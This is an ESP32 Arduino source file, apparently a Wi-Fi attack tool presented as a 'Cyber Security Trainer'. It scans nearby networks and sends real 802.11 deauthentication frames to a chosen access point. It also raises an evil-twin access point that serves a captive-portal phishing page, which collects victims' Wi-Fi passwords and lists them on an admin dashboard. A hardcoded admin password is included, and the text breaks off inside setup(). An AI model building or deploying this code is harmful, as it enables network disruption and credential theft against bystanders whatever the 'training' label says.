#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>

// ========== সার্ভার ডিক্লারেশন ==========
WebServer adminServer(80);
WebServer phishingServer(8080);

// ========== Admin AP সেটিংস ==========
const char* adminSSID = "Unknown";
const char* adminPASS = "R@bbi0606@";

// ========== গ্লোবাল ভেরিয়েবল ==========
String targetSSID = "";
String targetBSSID = "";
int targetChannel = 1;
bool isDeauthActive = false;
bool isEvilTwinActive = false;
String evilTwinSSID = "";
String evilTwinPASS = "connect123";

// ========== Deauth স্ট্যাটস ==========
unsigned long deauthStartTime = 0;
int deauthPacketsSent = 0;

// Deauth Packet Template
uint8_t deauthPacket[26] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (will be set)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be set)
    0x00, 0x00,                         // Fragment & Sequence number
    0x07, 0x00                          // Reason code: Class 3 frame received
};

// ========== নেটওয়ার্ক স্ক্যান ==========
String networkSSIDs[50];
String networkBSSIDs[50];
int networkChannels[50];
int networkRSSI[50];
int networkCount = 0;

// ========== ক্রেডেনশিয়াল স্টোরেজ ==========
struct Credential {
    String timestamp;
    String ssid;
    String username;
    String password;
    String clientIP;
};
Credential capturedCreds[100];
int credCount = 0;

// ========== ফাংশন ডিক্লারেশন ==========
String getTimestamp();
void scanNetworks();
void createEvilTwinAP(String ssid, String password, int channel);
void simulateDeauthAttack();
void setupAdminServer();

// ========== ইউটিলিটি ফাংশন ==========
String getTimestamp() {
    unsigned long ms = millis();
    int seconds = (ms / 1000) % 60;
    int minutes = (ms / (1000 * 60)) % 60;
    int hours = (ms / (1000 * 60 * 60)) % 24;
    
    char buffer[20];
    sprintf(buffer, "%02d:%02d:%02d", hours, minutes, seconds);
    return String(buffer);
}

// ========== HTML টেম্পলেটস ==========

// Admin Dashboard HTML
const char* adminDashboard = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyber Security Trainer - PlatformIO</title>
    <style>
        :root {
            --primary: #667eea;
            --secondary: #764ba2;
            --danger: #dc3545;
            --success: #28a745;
            --warning: #ffc107;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            background: white;
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            text-align: center;
        }
        
        h1 {
            color: var(--primary);
            margin-bottom: 10px;
        }
        
        .status-badge {
            display: inline-block;
            padding: 8px 20px;
            background: var(--success);
            color: white;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        @media (max-width: 768px) {
            .dashboard {
                grid-template-columns: 1fr;
            }
        }
        
        .card {
            background: white;
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        
        .card h2 {
            color: var(--primary);
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid #f0f0f0;
        }
        
        .btn {
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin: 5px;
            transition: all 0.3s;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
        }
        
        .btn-primary:hover {
            background: var(--secondary);
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        .btn-success {
            background: var(--success);
            color: white;
        }
        
        .btn-warning {
            background: var(--warning);
            color: #333;
        }
        
        .network-list {
            max-height: 400px;
            overflow-y: auto;
            margin-top: 15px;
        }
        
        .network-item {
            padding: 15px;
            margin: 8px 0;
            background: #f8f9fa;
            border-radius: 10px;
            border-left: 4px solid var(--primary);
            cursor: pointer;
        }
        
        .network-item:hover {
            background: #e9ecef;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-top: 20px;
        }
        
        .stat-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: var(--primary);
        }
        
        .tab-container {
            background: white;
            border-radius: 15px;
            padding: 25px;
            margin-top: 20px;
        }
        
        .tabs {
            display: flex;
            border-bottom: 2px solid #ddd;
            margin-bottom: 20px;
        }
        
        .tab {
            padding: 15px 25px;
            background: none;
            border: none;
            cursor: pointer;
            font-weight: 600;
            color: #666;
        }
        
        .tab.active {
            color: var(--primary);
            border-bottom: 3px solid var(--primary);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-control {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .scanning-text {
            text-align: center;
            color: var(--primary);
            font-weight: bold;
            margin-top: 10px;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .network-item.selected {
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            color: white;
            border-left: 4px solid #fff;
        }
        
        .signal-strength {
            display: inline-block;
            margin-left: 10px;
        }
        
        .signal-bar {
            display: inline-block;
            width: 3px;
            height: 12px;
            background: #ddd;
            margin: 0 1px;
            border-radius: 2px;
        }
        
        .signal-bar.active {
            background: #28a745;
        }
        
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            
            .card {
                padding: 15px;
            }
            
            .btn {
                padding: 10px 15px;
                font-size: 14px;
                margin: 3px;
            }
            
            h1 {
                font-size: 20px;
            }
            
            .stats {
                grid-template-columns: 1fr 1fr;
            }
            
            .stat-value {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔐 PlatformIO Cyber Security Trainer</h1>
            <div class="status-badge" id="systemStatus">সিস্টেম প্রস্তুত</div>
        </header>
        
        <div class="dashboard">
            <div class="card">
                <h2>📶 Wi-Fi Network Scanner</h2>
                <button class="btn btn-primary" id="scanBtn" onclick="scanNetworks()">
                    🔍 Scan Networks
                </button>
                <div class="network-list" id="networkList">
                    <!-- Networks will appear here -->
                </div>
            </div>
            
            <div class="card">
                <h2>🎯 Training Controls</h2>
                
                <div class="form-group">
                    <label>Target Network:</label>
                    <input type="text" class="form-control" id="targetNetwork" readonly>
                </div>
                
                <div class="stats">
                    <div class="stat-box">
                        <div class="stat-value" id="deauthCount">0</div>
                        <div class="stat-label">Deauth Packets</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="credCount">0</div>
                        <div class="stat-label">Credentials</div>
                    </div>
                </div>
                
                <div style="text-align: center; margin-top: 20px;">
                    <button class="btn btn-danger" id="btnDeauth" onclick="startDeauth()" disabled>
                        ⚡ Start Deauth
                    </button>
                    <button class="btn btn-warning" id="btnEvilTwin" onclick="createEvilTwin()" disabled>
                        👥 Create Evil Twin
                    </button>
                    <button class="btn btn-success" onclick="stopAll()">
                        ⏹️ Stop All
                    </button>
                </div>
                
                <div id="attackStatus" style="margin-top: 20px;"></div>
            </div>
        </div>
        
        <div class="tab-container">
            <div class="tabs">
                <button class="tab active" onclick="openTab('credentials')">🔑 Credentials</button>
                <button class="tab" onclick="openTab('settings')">⚙️ Settings</button>
            </div>
            
            <div id="credentials" class="tab-content">
                <h2>Captured Credentials</h2>
                <table style="width:100%; border-collapse:collapse; margin-top:20px;">
                    <thead>
                        <tr style="background:var(--primary); color:white;">
                            <th style="padding:12px;">Time</th>
                            <th>Network</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Client IP</th>
                        </tr>
                    </thead>
                    <tbody id="credTable">
                        <!-- Credentials will appear here -->
                    </tbody>
                </table>
            </div>
            
            <div id="settings" class="tab-content" style="display:none;">
                <h2>System Settings</h2>
                <div class="form-group">
                    <label>Evil Twin Password:</label>
                    <input type="text" class="form-control" id="evilPass" value="connect123">
                </div>
                <button class="btn btn-primary" onclick="saveSettings()">
                    Save Settings
                </button>
            </div>
        </div>
    </div>
    
    <script>
        let selectedNetwork = null;
        
        function scanNetworks() {
            let list = document.getElementById('networkList');
            let scanBtn = document.getElementById('scanBtn');
            
            // লোডার দেখান
            list.innerHTML = '<div class="loader"></div><div class="scanning-text">🔍 Scanning networks...</div>';
            scanBtn.disabled = true;
            scanBtn.textContent = '⏳ Scanning...';
            
            fetch('/scan')
                .then(r => r.json())
                .then(data => {
                    list.innerHTML = '';
                    
                    if(data.networks.length === 0) {
                        list.innerHTML = '<div style="text-align:center;padding:20px;color:#999;">No networks found</div>';
                    } else {
                        data.networks.forEach((net, idx) => {
                            let div = document.createElement('div');
                            div.className = 'network-item';
                            div.setAttribute('data-bssid', net.bssid);
                            
                            // Signal strength indicator
                            let strength = Math.min(4, Math.max(0, Math.floor((net.rssi + 100) / 12.5)));
                            let bars = '';
                            for(let i = 0; i < 4; i++) {
                                bars += `<span class="signal-bar ${i < strength ? 'active' : ''}"></span>`;
                            }
                            
                            div.innerHTML = `
                                <strong>${net.ssid || 'Hidden Network'}</strong>
                                <span class="signal-strength">${bars}</span><br>
                                <small>📡 Ch: ${net.channel} | 📶 ${net.rssi} dBm | 🔐 ${net.bssid}</small>
                            `;
                            div.onclick = () => selectNetwork(net, div);
                            list.appendChild(div);
                        });
                    }
                    
                    scanBtn.disabled = false;
                    scanBtn.textContent = '🔍 Scan Networks';
                })
                .catch(err => {
                    list.innerHTML = '<div style="text-align:center;padding:20px;color:red;">❌ Scan failed</div>';
                    scanBtn.disabled = false;
                    scanBtn.textContent = '🔍 Scan Networks';
                });
        }
        
        function selectNetwork(network, element) {
            selectedNetwork = network;
            
            // Remove previous selection
            document.querySelectorAll('.network-item').forEach(item => {
                item.classList.remove('selected');
            });
            
            // Add selection to clicked item
            if(element) element.classList.add('selected');
            
            document.getElementById('targetNetwork').value = network.ssid || 'Hidden Network';
            document.getElementById('btnDeauth').disabled = false;
            document.getElementById('btnEvilTwin').disabled = false;
        }
        
        function startDeauth() {
            if(!selectedNetwork) return alert('Select a network first');
            
            fetch(`/startDeauth?ssid=${encodeURIComponent(selectedNetwork.ssid)}&bssid=${encodeURIComponent(selectedNetwork.bssid)}&channel=${selectedNetwork.channel}`)
                .then(r => r.json())
                .then(data => {
                    if(data.success) {
                        document.getElementById('systemStatus').textContent = '🚨 Deauth Active';
                        document.getElementById('systemStatus').style.background = 'var(--danger)';
                        document.getElementById('btnDeauth').disabled = true;
                        
                        let status = document.getElementById('attackStatus');
                        status.innerHTML = `
                            <div style="background:#ffebee; padding:15px; border-radius:10px; border-left:5px solid var(--danger); animation:pulse 2s infinite;">
                                <strong>💥 Deauth Attack Active!</strong><br>
                                Target: ${selectedNetwork.ssid}<br>
                                BSSID: ${selectedNetwork.bssid}<br>
                                <button class="btn btn-danger" onclick="stopDeauth()" style="margin-top:10px;">
                                    ⏹️ Stop Deauth
                                </button>
                            </div>
                        `;
                        
                        updateStats();
                    }
                });
        }
        
        function createEvilTwin() {
            if(!selectedNetwork) return alert('Select a network first');
            
            let password = document.getElementById('evilPass').value;
            
            fetch(`/createEvilTwin?ssid=${encodeURIComponent(selectedNetwork.ssid)}&password=${password}&channel=${selectedNetwork.channel}`)
                .then(r => r.json())
                .then(data => {
                    if(data.success) {
                        document.getElementById('systemStatus').textContent = '👥 Evil Twin Active';
                        document.getElementById('systemStatus').style.background = 'var(--warning)';
                        document.getElementById('btnEvilTwin').disabled = true;
                        
                        let status = document.getElementById('attackStatus');
                        status.innerHTML = `
                            <div style="background:#fff3cd; padding:15px; border-radius:10px; border-left:5px solid var(--warning);">
                                <strong>👥 Evil Twin Created!</strong><br>
                                SSID: ${selectedNetwork.ssid}<br>
                                Password: ${password}<br>
                                <small style="color:#856404; display:block; margin-top:10px;">
                                    ℹ️ Admin Access: <a href="http://192.168.4.1/admin" target="_blank" style="color:#667eea;">192.168.4.1/admin</a><br>
                                    Victims will see login page on: <code>192.168.4.1</code>
                                </small>
                                <button class="btn btn-warning" onclick="stopEvilTwin()" style="margin-top:10px;">
                                    ⏹️ Stop Evil Twin
                                </button>
                            </div>
                        `;
                    }
                });
        }
        
        function stopDeauth() {
            fetch('/stopDeauth').then(() => {
                document.getElementById('systemStatus').textContent = 'System Ready';
                document.getElementById('systemStatus').style.background = 'var(--success)';
                document.getElementById('btnDeauth').disabled = false;
                document.getElementById('attackStatus').innerHTML = '';
            });
        }
        
        function stopEvilTwin() {
            fetch('/stopEvilTwin').then(() => {
                document.getElementById('systemStatus').textContent = 'System Ready';
                document.getElementById('systemStatus').style.background = 'var(--success)';
                document.getElementById('btnEvilTwin').disabled = false;
                document.getElementById('attackStatus').innerHTML = '';
            });
        }
        
        function stopAll() {
            fetch('/stopAll');
            document.getElementById('systemStatus').textContent = 'System Ready';
            document.getElementById('systemStatus').style.background = 'var(--success)';
            document.getElementById('btnDeauth').disabled = false;
            document.getElementById('btnEvilTwin').disabled = false;
            document.getElementById('attackStatus').innerHTML = '';
        }
        
        function openTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => tab.style.display = 'none');
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            
            document.getElementById(tabName).style.display = 'block';
            event.target.classList.add('active');
            
            if(tabName === 'credentials') {
                updateCredentials();
            }
        }
        
        function updateStats() {
            fetch('/getStats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('deauthCount').textContent = data.deauthPackets;
                    document.getElementById('credCount').textContent = data.credentials;
                    
                    if(data.deauthActive) {
                        setTimeout(updateStats, 1000);
                    }
                });
        }
        
        function updateCredentials() {
            fetch('/getCredentials')
                .then(r => r.json())
                .then(data => {
                    let tbody = document.getElementById('credTable');
                    tbody.innerHTML = '';
                    
                    data.forEach(cred => {
                        let row = tbody.insertRow();
                        row.insertCell(0).textContent = cred.timestamp;
                        row.insertCell(1).textContent = cred.ssid;
                        row.insertCell(2).textContent = cred.username || '-';
                        row.insertCell(3).textContent = '••••••••';
                        row.insertCell(4).textContent = cred.clientIP;
                        
                        // Password reveal on click
                        row.cells[3].onclick = function() {
                            if(this.textContent === '••••••••') {
                                this.textContent = cred.password;
                                this.style.color = 'red';
                            } else {
                                this.textContent = '••••••••';
                                this.style.color = '';
                            }
                        };
                    });
                });
        }
        
        function saveSettings() {
            alert('Settings saved!');
        }
        
        // Initialize
        window.onload = function() {
            scanNetworks();
            updateStats();
            setInterval(updateStats, 5000);
        };
    </script>
</body>
</html>
)rawliteral";

// Evil Twin Login Page
const char* phishingPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Login Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 380px;
            text-align: center;
        }
        .wifi-icon {
            font-size: 70px;
            color: #667eea;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            margin-bottom: 10px;
        }
        .network-name {
            color: #667eea;
            font-weight: bold;
            font-size: 20px;
            margin: 20px 0;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 12px 0;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
        }
        .security-note {
            margin-top: 25px;
            padding: 20px;
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 10px;
            color: #856404;
            text-align: left;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="wifi-icon">🔐</div>
        <h2>Wi-Fi Authentication Required</h2>
        <p>Please enter password to connect to</p>
        
        <div class="network-name" id="networkName">Loading...</div>
        
        <form id="loginForm">
            <input type="text" placeholder="Username (Optional)" id="username">
            <input type="password" placeholder="Wi-Fi Password" id="password" required>
            <button type="submit">Connect to Wi-Fi</button>
        </form>
        
        <div class="security-note">
            <strong>⚠️ CYBERSECURITY TRAINING DEMO</strong><br><br>
            This is an educational demonstration only.<br>
            In real life, never enter credentials on unfamiliar Wi-Fi networks.
        </div>
    </div>
    
    <script>
        // Get current network name
        fetch('/getNetwork')
            .then(r => r.json())
            .then(data => {
                document.getElementById('networkName').textContent = data.ssid;
            });
        
        document.getElementById('loginForm').onsubmit = async function(e) {
            e.preventDefault();
            
            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;
            let ssid = document.getElementById('networkName').textContent;
            
            let formData = new FormData();
            formData.append('ssid', ssid);
            formData.append('username', username);
            formData.append('password', password);
            
            await fetch('/login', {
                method: 'POST',
                body: formData
            });
            
            // Show success message
            document.body.innerHTML = `
                <div class="login-box">
                    <div class="wifi-icon" style="color:#28a745;">✅</div>
                    <h2>Connection Successful!</h2>
                    <p>You are now connected to the Wi-Fi network.</p>
                    
                    <div class="security-note" style="background:#d4edda;border-color:#28a745;color:#155724;">
                        <strong>🎓 TRAINING COMPLETE!</strong><br><br>
                        You have successfully completed the Wi-Fi security training.<br>
                        Remember: Always verify Wi-Fi networks before connecting.
                    </div>
                    
                    <button onclick="location.href='http://192.168.4.1'" style="margin-top:20px;">
                        Go to Trainer Dashboard
                    </button>
                </div>
            `;
        };
    </script>
</body>
</html>
)rawliteral";

// ========== ফাংশন ডেফিনিশন ==========

// নেটওয়ার্ক স্ক্যান
void scanNetworks() {
    Serial.println("\n[SCAN] Starting Wi-Fi scan...");
    
    // AP mode চালু রেখেই স্ক্যান করুন
    WiFi.mode(WIFI_AP_STA);
    delay(50);
    
    // দ্রুত স্ক্যান - শুধু active scan, 200ms timeout
    int n = WiFi.scanNetworks(false, false, false, 200);
    networkCount = min(n, 50);
    
    Serial.printf("[SCAN] Found %d networks in fast mode\n", networkCount);
    
    for(int i = 0; i < networkCount; i++) {
        networkSSIDs[i] = WiFi.SSID(i);
        networkBSSIDs[i] = WiFi.BSSIDstr(i);
        networkChannels[i] = WiFi.channel(i);
        networkRSSI[i] = WiFi.RSSI(i);
        
        Serial.printf("  %2d. %-32s (%s) Ch:%2d RSSI:%3d\n",
                     i+1,
                     networkSSIDs[i].c_str(),
                     networkBSSIDs[i].c_str(),
                     networkChannels[i],
                     networkRSSI[i]);
    }
    
    // স্ক্যান ডেটা পরিষ্কার করুন
    WiFi.scanDelete();
}

// Evil Twin AP তৈরি
void createEvilTwinAP(String ssid, String password, int channel) {
    Serial.println("\n[EVIL TWIN] Creating Evil Twin AP...");
    
    // AP reconfigure করুন (বন্ধ না করে)
    // এতে existing connections maintain হবে
    delay(100);
    
    // Evil Twin AP তৈরি করুন (target SSID দিয়ে)
    bool success = WiFi.softAP(ssid.c_str(), password.c_str(), channel, 0, 8);
    
    if(success) {
        isEvilTwinActive = true;
        evilTwinSSID = ssid;
        evilTwinPASS = password;
        
        Serial.println("[EVIL TWIN] ✅ Created successfully!");
        Serial.printf("  SSID: %s\n", ssid.c_str());
        Serial.printf("  Password: %s\n", password.c_str());
        Serial.printf("  Channel: %d\n", channel);
        Serial.printf("  IP Address: %s\n", WiFi.softAPIP().toString().c_str());
        Serial.println("\n  📱 For Victims: http://192.168.4.1");
        Serial.println("  🔐 For Admin: http://192.168.4.1/admin");
        
        // Evil Twin সার্ভার সেটআপ (Captive Portal)
        phishingServer.on("/", HTTP_GET, []() {
            // Check if accessing admin panel
            String host = phishingServer.header("Host");
            if(host.indexOf("admin") >= 0 || phishingServer.hasArg("admin")) {
                phishingServer.send(200, "text/html", adminDashboard);
            } else {
                phishingServer.send(200, "text/html", phishingPage);
            }
        });
        
        // Captive portal detection (for Android/iOS)
        phishingServer.on("/generate_204", HTTP_GET, []() {
            phishingServer.send(200, "text/html", phishingPage);
        });
        
        phishingServer.on("/hotspot-detect.html", HTTP_GET, []() {
            phishingServer.send(200, "text/html", phishingPage);
        });
        
        phishingServer.on("/getNetwork", HTTP_GET, []() {
            String json = "{\"ssid\":\"" + evilTwinSSID + "\"}";
            phishingServer.send(200, "application/json", json);
        });
        
        phishingServer.on("/login", HTTP_POST, []() {
            String ssid = evilTwinSSID;
            String username = phishingServer.arg("username");
            String password = phishingServer.arg("password");
            String clientIP = phishingServer.client().remoteIP().toString();
            
            // ক্রেডেনশিয়াল সেভ করুন
            if(credCount < 100) {
                capturedCreds[credCount].timestamp = getTimestamp();
                capturedCreds[credCount].ssid = ssid;
                capturedCreds[credCount].username = username;
                capturedCreds[credCount].password = password;
                capturedCreds[credCount].clientIP = clientIP;
                credCount++;
                
                Serial.println("\n[CREDENTIAL] 📧 Captured credential!");
                Serial.printf("  Time: %s\n", capturedCreds[credCount-1].timestamp.c_str());
                Serial.printf("  SSID: %s\n", ssid.c_str());
                Serial.printf("  Username: %s\n", username.c_str());
                Serial.printf("  Password: %s\n", password.c_str());
                Serial.printf("  Client IP: %s\n", clientIP.c_str());
            }
            
            phishingServer.send(200, "text/html", "OK");
        });
        
        phishingServer.begin();
        Serial.println("[EVIL TWIN] Server started on port 8080");
    } else {
        Serial.println("[EVIL TWIN] ❌ Failed to create AP");
    }
}

// Real Deauth Attack Function
void sendDeauthPacket() {
    if(!isDeauthActive || targetBSSID.length() < 17) return;
    
    // Parse BSSID string to bytes
    uint8_t bssid[6];
    if(sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]) != 6) {
        Serial.println("[DEAUTH] ❌ Invalid BSSID format!");
        return;
    }
    
    // Set BSSID in deauth packet (source and BSSID fields)
    memcpy(&deauthPacket[10], bssid, 6);
    memcpy(&deauthPacket[16], bssid, 6);
    
    // Send deauth packet using AP interface
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    
    if(result == ESP_OK) {
        deauthPacketsSent++;
        
        if(deauthPacketsSent % 100 == 0) {
            Serial.printf("[DEAUTH] 💥 Sent %d packets to %s [%s]\n", 
                         deauthPacketsSent, targetSSID.c_str(), targetBSSID.c_str());
        }
    } else if(deauthPacketsSent == 0) {
        Serial.printf("[DEAUTH] ⚠️ First packet failed: %d\n", result);
    }
}

// Deauth Attack Loop
void simulateDeauthAttack() {
    if(isDeauthActive) {
        // Send multiple packets for better effectiveness
        for(int i = 0; i < 5; i++) {
            sendDeauthPacket();
            delay(1);
        }
    }
}

// ========== Admin সার্ভার রাউটস ==========

void setupAdminServer() {
    // মূল ড্যাশবোর্ড
    adminServer.on("/", HTTP_GET, []() {
        // যদি Evil Twin active থাকে, তাহলে admin check করুন
        if(isEvilTwinActive) {
            String userAgent = adminServer.header("User-Agent");
            // Admin panel শুধু specific user-agent/query parameter দিয়ে access
            if(adminServer.hasArg("admin") || adminServer.uri() == "/admin") {
                adminServer.send(200, "text/html", adminDashboard);
            } else {
                // Victim দেখাবে phishing page
                adminServer.send(200, "text/html", phishingPage);
            }
        } else {
            adminServer.send(200, "text/html", adminDashboard);
        }
    });
    
    // Admin panel dedicated route
    adminServer.on("/admin", HTTP_GET, []() {
        adminServer.send(200, "text/html", adminDashboard);
    });
    
    // নেটওয়ার্ক স্ক্যান এন্ডপয়েন্ট
    adminServer.on("/scan", HTTP_GET, []() {
        scanNetworks();
        
        String json = "{\"networks\":[";
        for(int i = 0; i < networkCount; i++) {
            json += "{";
            json += "\"ssid\":\"" + networkSSIDs[i] + "\",";
            json += "\"bssid\":\"" + networkBSSIDs[i] + "\",";
            json += "\"channel\":" + String(networkChannels[i]) + ",";
            json += "\"rssi\":" + String(networkRSSI[i]);
            json += "}";
            if(i < networkCount - 1) json += ",";
        }
        json += "]}";
        
        adminServer.send(200, "application/json", json);
    });
    
    // Deauth শুরু
    adminServer.on("/startDeauth", HTTP_GET, []() {
        targetSSID = adminServer.arg("ssid");
        targetBSSID = adminServer.arg("bssid");
        targetChannel = adminServer.arg("channel").toInt();
        
        // Enable promiscuous mode for packet injection
        esp_wifi_set_promiscuous(true);
        
        // Change AP channel to target channel
        wifi_config_t conf;
        esp_wifi_get_config(WIFI_IF_AP, &conf);
        conf.ap.channel = targetChannel;
        esp_wifi_set_config(WIFI_IF_AP, &conf);
        
        delay(100);
        
        isDeauthActive = true;
        deauthStartTime = millis();
        deauthPacketsSent = 0;
        
        String response = "{\"success\":true,\"message\":\"Deauth started\"}";
        adminServer.send(200, "application/json", response);
        
        Serial.printf("\n[DEAUTH] 💥 Attack started!\n");
        Serial.printf("  Target: %s\n", targetSSID.c_str());
        Serial.printf("  BSSID: %s\n", targetBSSID.c_str());
        Serial.printf("  Channel: %d\n", targetChannel);
        Serial.println("  Mode: Real 802.11 deauth packets");
    });
    
    // Deauth বন্ধ
    adminServer.on("/stopDeauth", HTTP_GET, []() {
        isDeauthActive = false;
        esp_wifi_set_promiscuous(false);
        
        // Restore original AP channel if needed
        wifi_config_t conf;
        esp_wifi_get_config(WIFI_IF_AP, &conf);
        conf.ap.channel = 1; // Default channel
        esp_wifi_set_config(WIFI_IF_AP, &conf);
        
        adminServer.send(200, "application/json", "{\"success\":true}");
        Serial.printf("\n[DEAUTH] ✅ Attack stopped. Total packets sent: %d\n", deauthPacketsSent);
    });
    
    // Evil Twin তৈরি
    adminServer.on("/createEvilTwin", HTTP_GET, []() {
        String ssid = adminServer.arg("ssid");
        String password = adminServer.arg("password");
        int channel = adminServer.arg("channel").toInt();
        
        createEvilTwinAP(ssid, password, channel);
        
        String response = "{\"success\":true,\"message\":\"Evil Twin created\"}";
        adminServer.send(200, "application/json", response);
    });
    
    // Evil Twin বন্ধ
    adminServer.on("/stopEvilTwin", HTTP_GET, []() {
        // Evil Twin বন্ধ করে Admin AP restore করুন
        WiFi.softAPdisconnect(false);
        delay(100);
        isEvilTwinActive = false;
        
        // Admin AP আবার চালু করুন
        WiFi.softAP(adminSSID, adminPASS);
        
        // Phishing server বন্ধ করুন
        phishingServer.stop();
        
        adminServer.send(200, "application/json", "{\"success\":true}");
        Serial.println("\n[EVIL TWIN] Stopped, Admin AP restored");
    });
    
    // সব বন্ধ
    adminServer.on("/stopAll", HTTP_GET, []() {
        isDeauthActive = false;
        if(isEvilTwinActive) {
            WiFi.softAPdisconnect(true);
            WiFi.softAP(adminSSID, adminPASS);
            isEvilTwinActive = false;
        }
        adminServer.send(200, "application/json", "{\"success\":true}");
        Serial.println("\n[SYSTEM] All attacks stopped");
    });
    
    // স্ট্যাটিস্টিক্স
    adminServer.on("/getStats", HTTP_GET, []() {
        String json = "{";
        json += "\"deauthActive\":" + String(isDeauthActive ? "true" : "false") + ",";
        json += "\"deauthPackets\":" + String(deauthPacketsSent) + ",";
        json += "\"credentials\":" + String(credCount) + ",";
        json += "\"evilTwinActive\":" + String(isEvilTwinActive ? "true" : "false");
        json += "}";
        
        adminServer.send(200, "application/json", json);
    });
    
    // ক্রেডেনশিয়াল লিস্ট
    adminServer.on("/getCredentials", HTTP_GET, []() {
        String json = "[";
        for(int i = 0; i < credCount; i++) {
            json += "{";
            json += "\"timestamp\":\"" + capturedCreds[i].timestamp + "\",";
            json += "\"ssid\":\"" + capturedCreds[i].ssid + "\",";
            json += "\"username\":\"" + capturedCreds[i].username + "\",";
            json += "\"password\":\"" + capturedCreds[i].password + "\",";
            json += "\"clientIP\":\"" + capturedCreds[i].clientIP + "\"";
            json += "}";
            if(i < credCount - 1) json += ",";
        }
        json += "]";
        
        adminServer.send(200, "application/json", json);
    });
    
    // সার্ভার শুরু করুন
    adminServer.begin();
}

// ========== SETUP ফাংশন ==========

void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n\n╔══════════════════════════════════════════╗");
    Serial.println("║    ESP32 CYBER SECURITY TRAINER          ║");
    Serial.println("║    PlatformIO Version 3.0                ║");
    Serial.println("╚══════════════════════════════════════════╝");
    
    // WiFi কনফিগারেশন
    WiFi.mode(WIFI_AP);
    
    // Admin AP তৈরি করুন
    WiFi.softAP(adminSSID, adminPASS);
    
    Serial.println("\n✅ ADMIN ACCESS POINT CREATED");
    Serial.printf("   SSID: %s\n", adminSSID);
    Serial.printf("   Password: %s\n", adminPASS);
    Serial.printf("   IP Address: %s\n", WiFi.softAPIP().toString().c_str());
    
    // Admin সার্ভার সেটআপ
    setupAdminServer();
    
    Serial.println("\n🌐 WEB SERVERS STARTED");
    Serial.println("   Admin Dashboard: http://" + WiFi.softAPIP().toString());
    Serial.println("   Evil Twin Portal: http://" + WiFi.softAPIP().toString() + ":8080");
    
    // প্রাথমিক নেটওয়ার্ক স্ক্যান
    scanNetworks();
    
